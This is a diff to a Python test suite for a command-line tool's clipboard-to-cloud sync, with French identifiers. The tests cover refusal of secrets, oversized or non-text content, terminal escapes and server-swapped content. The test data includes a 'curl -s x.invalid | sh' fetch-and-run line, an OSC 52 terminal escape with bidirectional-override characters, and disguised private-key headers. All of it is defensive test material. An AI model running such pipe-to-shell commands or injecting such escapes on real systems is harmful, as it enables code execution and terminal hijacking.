@@ -3411,7 +3411,10 @@ class PressePapiers(CloudTest):
                                         "open(d + '/journal', 'a').write('wl-paste ' + ' '.join(sys.argv[1:]) + '\\n')\n"
                                         "f = d + ('/types' if '--list-types' in sys.argv else '/texte')\n"
                                         "if not os.path.exists(f): sys.exit(1)\n"
-                                        "sys.stdout.buffer.write(open(f, 'rb').read())\n"),
+                                        "sys.stdout.buffer.write(open(f, 'rb').read())\n"
+                                        "sys.stdout.flush()\n"
+                                        "if '--list-types' not in sys.argv and os.path.exists(d + '/bloque'):\n"
+                                        "    import time; time.sleep(30)\n"),
                            ("wl-copy", "import os, sys\nd = os.environ['FAUX_PRESSE']\n"
                                        "open(d + '/journal', 'a').write('wl-copy ' + ' '.join(sys.argv[1:]) + '\\n')\n"
                                        "open(d + '/copie', 'wb').write(sys.stdin.buffer.read())\n")):
@@ -3438,6 +3441,9 @@ class PressePapiers(CloudTest):
         dossier = next((e for e in self.faux.entries.values() if e["kind"] == "directory" and e["name"] == "Presse-papiers"), None)
         return [e for e in self.faux.entries.values() if dossier and e.get("parent") == dossier["id"]]
 
+    def envois_presse(self):
+        return [c for c in self.manifestes() if "/nc-cloud/presse/" in str(json.loads(c.read_text()).get("source"))]
+
     def envoyer(self, code=0):
         v = self.nc("presse", "voir", code=0).lignes[-1]
         return self.nc("presse", "envoyer", "--empreinte", v["empreinte"], code=code)
@@ -3449,6 +3455,10 @@ class PressePapiers(CloudTest):
         v = self.nc("presse", "voir", code=0).lignes[-1]
         self.assertEqual((v["sens"], v["apercu"], v["caracteres"], v["lignes"]), ("envoi", self.TEXTE, len(self.TEXTE), 3))
         self.assertEqual(len(self.faux.journal), n)                                      # voir : aucun appel au serveur
+        nu = hashlib.sha256(self.TEXTE.encode()).hexdigest()
+        self.assertNotEqual(v["empreinte"], nu)
+        cle = self.home / ".local/state/nc-cloud/presse.cle"
+        self.assertEqual((cle.stat().st_mode & 0o777, len(cle.read_bytes())), (0o600, 32))
         r = self.nc("presse", "envoyer", "--empreinte", v["empreinte"], code=0)
         self.assertIn("il remplace le précédent", r.lignes[-1]["message"])
         (f,) = self.fichier_cloud()
@@ -3457,7 +3467,7 @@ class PressePapiers(CloudTest):
         self.envoyer()
         (f,) = self.fichier_cloud()                                                     # un seul fichier, qui s'écrase
         self.assertEqual(self.faux.contenus[f["id"]], "deuxième".encode())
-        self.assertFalse(list((self.home / ".local/state/nc-cloud/presse").iterdir()))   # rien ne reste en local
+        self.assertFalse((self.home / ".local/state/nc-cloud/presse").exists())   # rien ne reste en local
         # Prendre : l'aperçu, puis exactement ce qui a été vu ; copié par l'entrée de wl-copy, puis retiré du cloud
         p = self.nc("presse", "voir-cloud", code=0).lignes[-1]
         self.assertEqual((p["sens"], p["apercu"], p["lignes"], p["id"]), ("prise", "deuxième", 1, f["id"]))
@@ -3469,6 +3479,9 @@ class PressePapiers(CloudTest):
         self.assertEqual(sorted(set((self.p / "journal").read_text().splitlines())),
                          ["wl-copy --type text/plain", "wl-paste --list-types", "wl-paste --no-newline --type text/plain"])
         self.nc("presse", "voir-cloud", code=1)                                          # plus rien
+        for o in self.sorties:                                     # ni le SHA-256 nu du texte, ni celui de « deuxième »
+            self.assertNotIn(nu, o)
+            self.assertNotIn(hashlib.sha256("deuxième".encode()).hexdigest(), o)
 
     def test_refus_a_l_envoi(self):
         cles = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ\n-----END OPENSSH PRIVATE KEY-----\n"
@@ -3477,6 +3490,8 @@ class PressePapiers(CloudTest):
                 ("image", b"du texte valide", "image/png\n", "pas_texte"),          # pas de type texte annoncé
                 ("trop long", b"a" * (64 * 1024 + 1), "text/plain\n", "trop_long"),
                 ("pas UTF-8", b"\xff\xfe", "text/plain\n", "pas_texte"),
+                ("NUL", b"a\0b", "text/plain\n", "pas_texte"),
+                ("invisibles seuls", "\u200b\u2060\n".encode(), "text/plain\n", "vide"),
                 ("vide", b"  \n", "text/plain\n", "vide"),
                 ("secret", cles.encode(), "text/plain\n", "secret")):
             with self.subTest(nom):
@@ -3516,13 +3531,13 @@ class PressePapiers(CloudTest):
         self.envoyer()
         (f,) = self.fichier_cloud()
         # Un autre PC y a mis une séquence de terminal (OSC 52, couleur) et un renversement du sens d'écriture
-        sale = "a\x1b]52;c;ZXZpbA==\x07b\x1b[31mc\u202ed\te\r\n".encode()
+        sale = "a\x1b]52;c;ZXZpbA==\x07b\x1b[31mc\u202ed\te\r\n\u2060f\u00adg\U000E0041h\ue000\u2028i\u2029j".encode()
         self.faux.contenus[f["id"]] = sale
         f.update(size=len(sale), sha256=hashlib.sha256(sale).hexdigest(), revision="r-sale")
         p = self.nc("presse", "voir-cloud", code=0).lignes[-1]
-        self.assertEqual(p["apercu"], "a]52;c;ZXZpbA==b[31mcd\te\n")
+        self.assertEqual((p["apercu"], p["lignes"]), ("a]52;c;ZXZpbA==b[31mcd\te\nfgh\ni\nj", 4))
         self.nc("presse", "prendre", "--id", p["id"], "--revision", p["revision"], "--empreinte", p["empreinte"], code=0)
-        self.assertEqual((self.p / "copie").read_bytes(), "a]52;c;ZXZpbA==b[31mcd\te\n".encode())
+        self.assertEqual((self.p / "copie").read_bytes(), "a]52;c;ZXZpbA==b[31mcd\te\nfgh\ni\nj".encode())
         # Changé depuis l'aperçu, secret, trop gros : rien n'est pris
         self.copier(b"v1")
         self.envoyer()
@@ -3531,14 +3546,14 @@ class PressePapiers(CloudTest):
         (self.p / "copie").unlink()
         self.assertEqual(self.nc("presse", "prendre", "--id", p["id"], "--revision", "autre", "--empreinte", p["empreinte"],
                                  code=6).lignes[-1]["erreur"], "change")
-        cle = b"-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n-----END RSA PRIVATE KEY-----\n"
+        cle = "-----BEGIN RSA PRIVATE KEY-\u200b----\nMIIEow\n-----END RSA PRIVATE K\u200bEY-----\n".encode()   # recollée
         self.faux.contenus[f["id"]] = cle
         f.update(size=len(cle), sha256=hashlib.sha256(cle).hexdigest())
         self.assertEqual(self.nc("presse", "voir-cloud", code=2).lignes[-1]["erreur"], "secret")
         f.update(size=64 * 1024 + 1)
         self.assertEqual(self.nc("presse", "voir-cloud", code=1).lignes[-1]["erreur"], "trop_long")
         self.assertFalse((self.p / "copie").exists())
-        self.assertFalse(list((self.home / ".local/state/nc-cloud/presse").iterdir()))
+        self.assertFalse((self.home / ".local/state/nc-cloud/presse").exists())
 
     def test_pris_mais_pas_retire_c_est_dit(self):
         self.envoyer()
@@ -3554,8 +3569,73 @@ class PressePapiers(CloudTest):
         self.faux.pannes.add("perdre_creation")
         r = self.nc("presse", "envoyer", "--empreinte", v["empreinte"])
         self.assertNotEqual(r.returncode, 0)
-        self.assertFalse(list((self.home / ".local/state/nc-cloud/presse").iterdir()))
-        self.assertFalse([m for _, m in self.manifestes() if "presse" in str(m.get("source"))])
+        self.assertFalse((self.home / ".local/state/nc-cloud/presse").exists())
+        self.assertFalse(self.envois_presse())
+
+    def test_prise_les_octets_recus_sont_ceux_de_l_apercu(self):
+        self.copier(b"echo bonjour")
+        self.envoyer()
+        (f,) = self.fichier_cloud()
+        p = self.nc("presse", "voir-cloud", code=0).lignes[-1]
+        mal = b"echo bonjour\ncurl -s x.invalid | sh\n"         # même id, même révision : le serveur rend autre chose
+        self.faux.contenus[f["id"]] = mal
+        f.update(size=len(mal), sha256=hashlib.sha256(mal).hexdigest())
+        r = self.nc("presse", "prendre", "--id", p["id"], "--revision", p["revision"], "--empreinte", p["empreinte"], code=6)
+        self.assertEqual(r.lignes[-1]["erreur"], "change")
+        self.assertFalse((self.p / "copie").exists())
+        self.assertEqual(len(self.fichier_cloud()), 1)
+
+    def test_sigkill_pendant_l_envoi_rien_ne_reste(self):
+        secret = b"texte prive a ne pas laisser"
+        for apres in (("presse", "voir"), ("reprendre",)):
+            with self.subTest(apres[0]):
+                self.copier(secret)
+                v = self.nc("presse", "voir", code=0).lignes[-1]
+                self.faux.lent = 3
+                n = len(self.faux.journal)
+                pr = subprocess.Popen([sys.executable, str(NC_CLOUD), "--json", "presse", "envoyer", "--empreinte", v["empreinte"]],
+                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=self.env(), stdin=subprocess.DEVNULL)
+                fin = time.time() + 20
+                while time.time() < fin and not any(c[0] == "PUT" for c in self.faux.journal[n:]):
+                    time.sleep(0.05)
+                pr.kill()                                          # ce processus, par son pid
+                pr.wait(timeout=30)
+                self.faux.lent = 0
+                self.assertTrue(self.envois_presse())   # l'état coupé
+                r = self.nc(*apres, code=0)
+                if apres == ("reprendre",):
+                    self.assertEqual(r.lignes[-1]["envois"], [])
+                self.assertFalse(self.envois_presse())
+                self.assertFalse([q for q in self.home.rglob("*") if q.is_file() and secret in q.read_bytes()])
+
+    def test_echec_du_depot_c_est_dit(self):
+        self.faux.pannes.add("publier_ailleurs_toujours")
+        r = self.envoyer(code=6)
+        self.assertIn("Un autre PC vient d'envoyer", r.lignes[-1]["message"])
+        self.faux.pannes.discard("publier_ailleurs_toujours")
+        self.faux.quota = 3
+        r = self.envoyer(code=7)
+        self.assertEqual(r.lignes[-1]["erreur"], "quota")
+        self.assertEqual(self.fichier_cloud(), [])
+
+    def test_apercu_long_debut_et_fin(self):
+        t = "d" * 150 + "x" * 100 + "curl mal | sh" + "f" * 37
+        self.copier(t.encode())
+        v = self.nc("presse", "voir", code=0).lignes[-1]
+        self.assertEqual((v["apercu"], v["caches"], v["caracteres"]), ("d" * 150 + "…" + t[-50:], 100, 300))
+        self.assertIn("curl mal | sh", v["apercu"])
+        self.copier(b"court")
+        self.assertEqual(self.nc("presse", "voir", code=0).lignes[-1]["caches"], 0)
+
+    def test_wl_paste_lu_au_plus_64_kio(self):
+        (self.p / "bloque").write_text("1")                      # écrit, puis ne finit jamais
+        self.copier(b"a" * (64 * 1024 + 10))
+        debut = time.time()
+        self.assertEqual(self.nc("presse", "voir", code=2).lignes[-1]["erreur"], "trop_long")
+        self.assertLess(time.time() - debut, 4)                   # sans attendre les 5 s : la lecture s'arrête à la borne
+        self.copier(b"court")
+        self.assertIn("ne répond pas", self.nc("presse", "voir", code=1).lignes[-1]["message"])
+
 
 
 # PressePapiers reprend le faux serveur de CloudTest, pas ses tests
